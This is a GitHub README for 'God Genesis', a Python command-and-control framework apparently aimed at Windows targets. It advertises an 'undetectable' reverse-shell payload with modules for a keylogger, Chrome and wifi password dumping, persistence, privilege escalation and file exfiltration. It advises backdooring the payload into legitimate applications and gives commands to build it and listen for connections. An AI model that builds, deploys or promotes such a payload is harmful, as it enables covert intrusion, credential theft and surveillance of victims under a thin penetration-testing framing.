# Welcome To God Genesis
![FinalGod](https://user-images.githubusercontent.com/66937297/175554898-58c56076-7cf9-4b1d-9d5d-2f2b27a9c0e3.png)

God Genesis is a C2 server purely coded in Python3 created to help Red Teamers and Penetration Testers. 
Currently It only supports TCP reverse shell but wait a min, its a FUD and can give u admin shell from any targeted WINDOWS Machine.

## The List Of Commands It Supports
**BASIC COMANDS**
| Command       |Description|
| ------------- |:---------:|
| help    | Show help menu |
| terminate |  Exit the shell completely |
| exit | Exit to C2 server prompt (Shell works in background)|
| clear | Clear the previous output|

***
**SYSTEM COMANDS**
| Command       |Description|
| ------------- |:---------:|
| cd   | Change directory |
| pwd  | Print current working directory |
| mkdir *dir_name* | Create a specified directory |
|  rm *dir_name*   | Delete a specified directory |
| powershell <command>  | Run Powershell command |
|  start *exe_name*   | Start a specified executable |

***
**INFORMATION GATHERING COMMANDS**
| Command       |Description|
| ------------- |:---------:|
| env | Checks enviornment variables |
| sc  | List all running services |
| user  | Current user |
| info  | Get all information about compromised system |
| av | List all antivirus(es) in compromised system |
                        
***
**DATA EXFILTRATION COMMANDS**
| Command       |Description|
| ------------- |:---------:|
| download *file_name*  | Download files from compromised system |
| upload *file_name*    | Upload files to compromised system     |

***
**EXPLOITATION COMMANDS**
| Command       |Description|
| persistence1  | Persistence via Method 1 |
|  persistence2 | Persistance via Method 2 |
| get | Download files from any url |
| chrome_pass_dump  | Dump all stored passwords from Chrome browser |
|  wifi_password  | Dump passwords of all saved Wifi networks |
| keylogger | Start keylogger |
| dump_keylogger  | Dump all logs done by keylogger | 
| python_install  | Install Python on compromised pc without UI |


# Features Of Our Framework :-
> Check the video to get a detailed tutorial

- [x] The Payload.py is a FULLY UNDETECTABLE(FUD) use your own techniques for making an exe file. (Best Result When Backdoored With Some Other Legitimate Applictions)
- [x] Able to perform privilege escalation on any windows systems.
- [x] Fud keylogger
- [x] 2 ways of achieving persistance 
- [x] Recon automation to save your time.

# Installation
1. **Clone the repo**
```
git clone https://github.com/SaumyajeetDas/GodGenesis.git
```

2. **Install dependencies**
```
pip3 install -r requirements.txt
```
> The readline and rich modules will be enough to run c2c.py

# How To Use Our Tool: 
## Build the payload
```
python3 c2c.py build --ip <ip> --port <port> -outfile <output_filename>
```
> This will generate a payload with the name specified in the --outfile option.

## Listen for connections
```
python3 c2c.py listen --ip <ip> --port <port>
```

## Arguments
| Argument       |Description|
| ------------- |:---------:|
| mode    | mode (build, listen) |
| ``-i/--ip`` |  ip |
| ``-p/--port`` | port |
| ``-o/--outfile`` | payload output filename (works with build mode)|

> It is worth mentioning that [Suman Chakraborty](https://github.com/ANON4MOUS)
has contributed to the framework by coding the Fud Keyloger, Wifi Password Extraction and Chrome Password Dumper modules. 


https://user-images.githubusercontent.com/66937297/175561859-a0e9f9dd-1e59-46da-a8e9-197d800bee37.mp4
